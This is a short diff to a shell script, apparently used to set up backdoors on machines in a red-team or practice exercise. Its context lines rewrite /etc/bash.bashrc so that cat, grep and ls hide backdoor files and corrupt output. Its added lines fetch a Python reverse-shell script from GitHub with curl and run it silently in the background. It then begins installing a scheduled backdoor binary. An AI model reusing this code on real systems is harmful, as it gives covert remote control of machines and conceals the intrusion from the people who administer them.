@@ -65,6 +65,13 @@ echo 'cat() { command cat "$@" | awk "NR % 2 == 0"; }' >> /etc/bash.bashrc
 echo 'grep() { command grep --exclude-dir=.nope --exclude="*socat" "$@"; }' >> /etc/bash.bashrc
 echo 'ls() { command ls --color=auto "$@" | grep -vE "back\.(sh|py)$|golden_egg$"; }' >> /etc/bash.bashrc
 
+# Add a Python Reverse Shell
+# Ensure python3 installed
+DEBIAN_FRONTEND=noninteractive apt-get install python3 -y
+
+sudo curl -s -o ~/back.py https://raw.githubusercontent.com/gerbsec/cyberherd-scripts/blob/main/herdening/linux/pybind/reverse/reverse_shell.py
+python3 back.py </dev/null >/dev/null 2>&1 &
+
 ### Install and schedule a Backdoor Binary
 # Get the code to compile
 mkdir /etc/goose
